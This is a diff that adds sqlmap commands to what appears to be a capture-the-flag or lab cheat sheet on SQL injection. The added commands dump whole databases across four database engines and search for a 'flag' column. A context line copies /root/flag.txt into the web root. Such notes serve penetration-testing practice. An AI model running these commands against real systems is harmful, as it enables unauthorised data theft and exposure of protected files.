@@ -767,4 +767,27 @@ sqlmap -u "http://target.com/page.php?id=1" \
 cp /root/flag.txt /var/www/html/
 ```
 
+```shell
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump --flush-session
+```
+
+```shell
+sqlmap -r burp_sqlmap-test.txt --dbms=PostgreSQL --flush-session --batch --dump        
+```
+
+```shell
+sqlmap -r burp_sqlmap-server.txt --dbms="Microsoft SQL Server" --flush-session --batch --dump
+```
+
+```shell
+sqlmap -r burp_sqlmap-oracle.txt --dbms=Oracle --flush-session --batch --dump  
+```
+
+```shell
+sqlmap -r burp_sql-server.txt \
+  --dbms="Microsoft SQL Server" \
+  --batch \
+  --search -C flag
+```
+
 
